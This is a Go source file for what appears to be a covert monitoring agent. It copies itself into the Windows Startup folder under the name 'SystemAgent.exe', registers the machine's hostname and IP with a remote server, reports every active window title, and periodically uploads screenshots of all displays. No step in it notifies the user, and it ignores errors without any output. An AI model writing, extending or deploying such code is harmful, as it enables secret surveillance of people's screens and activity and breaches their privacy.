package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/joho/godotenv"
	"github.com/kbinani/screenshot"
)

var (
	client    = resty.New()
	serverURL string
	agentID   uint
)

func main() {
	// auto start setup for Windows
	if runtime.GOOS == "windows" {
		setupWindowsStartup()
	}

	godotenv.Load() 
	
	serverURL = getEnv("SERVER_URL", "http://10.10.7.72:8080")
	intervalStr := getEnv("SCREENSHOT_INTERVAL_SEC", "60")
	interval, _ := strconv.Atoi(intervalStr)
	if interval == 0 {
		interval = 60
	}

	// connection server and register
	registerSelf()
	
	// start background tasks
	go trackActivity()
	go uploadScreenshots(time.Duration(interval) * time.Second)

	select {} // always run
}

// --- Helper Functions ---

func getEnv(key, fallback string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return fallback
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil { return "unknown" }
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil { return ipNet.IP.String() }
		}
	}
	return "unknown"
}

func registerSelf() {
	hostname, _ := os.Hostname()
	localIP := getLocalIP()
	
	resp, err := client.R().
		SetBody(map[string]interface{}{
			"hostname":   hostname,
			"os":         runtime.GOOS,
			"ip_address": localIP,
		}).
		Post(serverURL + "/api/register")

	if err != nil {
		// retry after some time no error print background
		time.Sleep(10 * time.Second)
		registerSelf()
		return
	}

	var result map[string]interface{}
	json.Unmarshal(resp.Body(), &result)
	if id, ok := result["agent_id"].(float64); ok {
		agentID = uint(id)
	} else {
		agentID = 1
	}
}

func trackActivity() {
	lastWindow := ""
	for {
		// getActiveWindowTitle function will come from another file
		currentWindow := getActiveWindowTitle()
		if currentWindow != "" && currentWindow != lastWindow {
			client.R().
				SetBody(map[string]interface{}{
					"agent_id": agentID,
					"window":   currentWindow,
				}).
				Post(serverURL + "/api/activity")
			lastWindow = currentWindow
		}
		time.Sleep(1 * time.Second)
	}
}

func uploadScreenshots(interval time.Duration) {
	for {
		time.Sleep(interval)
		n := screenshot.NumActiveDisplays()
		if n <= 0 { continue }
	
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil { continue }
			
			var imageBuf bytes.Buffer
			png.Encode(&imageBuf, img)
			
			filename := fmt.Sprintf("screen_display_%d.png", i)
			client.R().
				SetFormData(map[string]string{
					"agent_id": fmt.Sprintf("%d", agentID),
					"display":  fmt.Sprintf("%d", i),
				}).
				SetFileReader("file", filename, &imageBuf).
				Post(serverURL + "/api/screenshot")
		}
	}
}

// --- Auto Install Logic (Windows Only) ---
func setupWindowsStartup() {
	// present file location search and copy to startup if not exists
	exePath, err := os.Executable()
	if err != nil { return }

	// running from startup check
	configDir, err := os.UserConfigDir()
	if err != nil { return }
	startupDir := filepath.Join(configDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	destPath := filepath.Join(startupDir, "SystemAgent.exe") 

	// check if already running from startup
	if exePath == destPath {
		return 
	}

	// if not present then copy itself to startup
	if _, err := os.Stat(destPath); os.IsNotExist(err) {
		srcFile, err := os.Open(exePath)
		if err != nil { return }
		defer srcFile.Close()

		destFile, err := os.Create(destPath)
		if err != nil { return }
		defer destFile.Close()

		_, err = io.Copy(destFile, srcFile)
		if err != nil { return }

		// run from startup location
		cmd := exec.Command(destPath)
		cmd.Start()

		// exit current instance
		os.Exit(0)
	}
}